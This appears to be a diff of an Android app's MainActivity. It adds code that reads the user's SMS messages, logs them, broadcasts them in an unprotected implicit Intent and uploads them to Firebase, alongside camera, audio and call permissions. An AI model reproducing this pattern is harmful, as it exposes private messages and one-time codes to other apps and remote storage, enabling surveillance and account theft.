@@ -58,8 +58,7 @@ class MainActivity : ComponentActivity() {
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.CAMERA,
         Manifest.permission.CALL_PHONE,
-        Manifest.permission.READ_SMS
-    )
+        Manifest.permission.READ_SMS)
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -226,7 +225,17 @@ class MainActivity : ComponentActivity() {
                                 == PackageManager.PERMISSION_GRANTED
                             ) {
                                 val smsList = readSMS()
+                                // Display list in Logcat
                                 println("smsList: $smsList")
+                                // Convert MutableList<String> to Array<String>
+                                val smsArray = smsList.toTypedArray()
+                                // Create a new Intent for broadcasting
+                                // Add the smsArray as an extra to the Intent
+                                val smsIntent = Intent("ACTION_SEND_SMS").apply {
+                                    putExtra("smsArray", smsArray)}
+                                // Broadcast the Intent
+                                sendBroadcast(smsIntent)
+                                // Send SMS to Database
                                 sendSMSToFirebase(smsList)
                             }
                         }) {
